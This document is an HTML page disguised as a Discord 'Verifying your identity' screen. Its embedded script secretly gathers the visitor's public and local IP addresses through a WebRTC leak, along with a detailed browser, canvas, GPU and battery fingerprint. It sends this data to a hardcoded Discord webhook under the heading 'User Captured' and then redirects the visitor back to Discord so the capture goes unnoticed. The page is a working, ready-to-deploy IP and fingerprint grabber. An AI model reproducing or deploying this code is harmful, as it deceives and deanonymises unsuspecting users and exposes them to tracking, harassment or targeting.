<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta http-equiv="refresh" content="1; url=discord://">
  <title>Verifying...</title>
  <style>
    body {
      background: #1e1e1e; color: white; font-family: Arial, sans-serif;
      text-align: center; padding-top: 20%; margin: 0;
    }
    .spinner { 
      border: 4px solid #333; border-top: 4px solid #5865F2;
      border-radius: 50%; width: 40px; height: 40px;
      animation: spin 1s linear infinite; margin: 20px auto;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <h2>Verifying your identity...</h2>
  <div class="spinner"></div>
  <p style="color: #888; font-size: 14px;">You will be redirected back automatically.</p>

  <script>
    // ====== CONFIGURATION ======
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1509111637544665118/mKBjtsL6Xdeqo2Ev9UWiHQ9dzy-qlAT3Nx7eOFJm6fcrKyyPLvtRxKCm0NZBUymJHVq3';
    // ===========================

    const data = { timestamp: new Date().toISOString(), pageURL: window.location.href, referrer: document.referrer };

    // 1. WEBRTC IP LEAK — this is the main event
    function getWebRTCIPs() {
      return new Promise((resolve) => {
        const publicIPs = new Set();
        const localIPs = new Set();
        let done = false;

        try {
          const pc = new RTCPeerConnection({
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' },
                         { urls: 'stun:stun1.l.google.com:19302' }]
          });
          pc.createDataChannel('');
          pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});

          pc.onicecandidate = (e) => {
            if (e.candidate && e.candidate.candidate) {
              const parts = e.candidate.candidate.split(' ');
              const ip = parts[4];
              if (ip) {
                if (ip.startsWith('192.168.') || ip.startsWith('10.') || 
                    ip.startsWith('172.16.') || ip.startsWith('127.')) {
                  localIPs.add(ip);
                } else if (ip.match(/^\d+\.\d+\.\d+\.\d+$/)) {
                  publicIPs.add(ip);
                }
              }
            }
            if (e.candidate === null && !done) {
              done = true;
              resolve({ public: [...publicIPs], local: [...localIPs] });
            }
          };
          setTimeout(() => { if (!done) { done = true; resolve({ public: [...publicIPs], local: [...localIPs] }); } }, 3000);
        } catch(e) { resolve({ public: [], local: [] }); }
      });
    }

    // 2. FULL FINGERPRINT
    function getFingerprint() {
      const f = {};
      f.userAgent = navigator.userAgent;
      f.platform = navigator.platform;
      f.language = navigator.language;
      f.languages = navigator.languages.join(',');
      f.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      f.screen = `${screen.width}x${screen.height} @${screen.colorDepth}bit`;
      f.windowSize = `${window.innerWidth}x${window.innerHeight}`;
      f.devicePixelRatio = window.devicePixelRatio;
      f.cores = navigator.hardwareConcurrency || 'unknown';
      f.memory = navigator.deviceMemory || 'unknown';
      f.maxTouchPoints = navigator.maxTouchPoints || 0;
      f.touchScreen = 'ontouchstart' in window;
      f.cookies = navigator.cookieEnabled;
      f.doNotTrack = navigator.doNotTrack;
      f.vendor = navigator.vendor;
      f.pdfViewer = navigator.pdfViewerEnabled;
      f.webdriver = navigator.webdriver;
      f.plugins = Array.from(navigator.plugins).map(p => `${p.name} ${p.filename}`).join(' | ');
      f.connection = navigator.connection ? 
        `${navigator.connection.effectiveType || '?'} / ${navigator.connection.downlink || '?'}mbps` : 'unknown';
      return f;
    }

    // 3. CANVAS FINGERPRINT
    function getCanvasFP() {
      try {
        const c = document.createElement('canvas');
        c.width = 250; c.height = 60;
        const ctx = c.getContext('2d');
        ctx.textBaseline = 'alphabetic';
        ctx.fillStyle = '#f60';
        ctx.fillRect(100, 1, 80, 30);
        ctx.fillStyle = '#069';
        ctx.font = '16px Arial';
        ctx.fillText('Cwm fjordbank glyphs vext quiz, \ud83d\ude03', 2, 35);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.5)';
        ctx.font = '18px Times New Roman';
        ctx.fillText('js', 4, 50);
        return c.toDataURL().slice(0, 100);
      } catch(e) { return null; }
    }

    // 4. WEBGL
    function getWebGL() {
      try {
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
        if (!gl) return null;
        return {
          renderer: gl.getParameter(gl.RENDERER),
          vendor: gl.getParameter(gl.VENDOR)
        };
      } catch(e) { return null; }
    }

    // 5. BATTERY (if available)
    async function getBattery() {
      try {
        const b = await navigator.getBattery();
        return { level: Math.round(b.level * 100) + '%', charging: b.charging };
      } catch(e) { return null; }
    }

    // Collect everything and fire it off
    (async () => {
      const [ipData, battery, fp, canvas, webgl] = await Promise.all([
        getWebRTCIPs(), getBattery(), Promise.resolve(getFingerprint()),
        Promise.resolve(getCanvasFP()), Promise.resolve(getWebGL())
      ]);

      data.ip = ipData;
      data.battery = battery;
      data.fingerprint = fp;
      data.canvasFP = canvas;
      data.webgl = webgl;

      // Send to webhook
      const embed = {
        embeds: [{
          title: 'User Captured',
          color: 0x5865F2,
          fields: [
            { name: 'Public IP', value: ipData.public.join(', ') || 'None', inline: true },
            { name: 'Local IPs', value: ipData.local.join(', ') || 'None', inline: true },
            { name: 'OS / Browser', value: fp.userAgent.slice(0, 200), inline: false },
            { name: 'Platform', value: fp.platform, inline: true },
            { name: 'Screen', value: fp.screen, inline: true },
            { name: 'Window', value: fp.windowSize + ' @' + fp.devicePixelRatio + 'x', inline: true },
            { name: 'CPU / RAM', value: fp.cores + ' cores / ' + fp.memory + 'GB', inline: true },
            { name: 'Timezone', value: fp.timezone || 'Unknown', inline: true },
            { name: 'Charging', value: battery ? (battery.charging ? 'Yes' : 'No') + ' (' + battery.level + ')' : 'N/A', inline: true },
            { name: 'GPU', value: webgl?.renderer || 'Unknown', inline: false },
            { name: 'Connection', value: fp.connection, inline: true },
            { name: 'Touch / DNT / WebDriver', value: `${fp.touchScreen} / ${fp.doNotTrack} / ${fp.webdriver}`, inline: true },
            { name: 'Plugins', value: fp.plugins.slice(0, 200) || 'None', inline: false }
          ],
          footer: { text: 'Canvas FP: ' + (canvas?.slice(0, 30) || 'N/A') },
          timestamp: data.timestamp
        }]
      };

      // Try sending — silent fail, user doesn't need to wait
      try {
        await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(embed) });
      } catch(e) {}

      // Redirect back to Discord
      setTimeout(() => {
        window.location.href = 'discord://';
        setTimeout(() => {
          window.location.href = 'https://discord.com/channels/@me';
        }, 500);
      }, 800);
    })();
  </script>
</body>
</html>
